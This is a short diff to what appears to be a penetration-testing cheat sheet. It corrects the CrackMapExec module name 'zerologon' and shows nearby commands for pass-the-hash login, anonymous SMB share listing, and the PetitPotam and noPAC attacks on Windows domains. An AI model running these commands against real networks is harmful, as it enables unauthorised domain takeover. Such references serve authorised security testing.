@@ -345,7 +345,7 @@ sudo crackmapexec smb <target ip(s)> -u <username> -H 'NTHASH'
 sudo crackmapexec smb <target ip> -u 'anonymous' -p '' --shares   
 
 # Zerologon
-crackmapexec smb <target ip> -u <username> -p <password> -M zerologo
+crackmapexec smb <target ip> -u <username> -p <password> -M zerologon
 # PetitPotam
 crackmapexec smb <target ip> -u <username> -p <password> -M petitpotam
 # noPAC
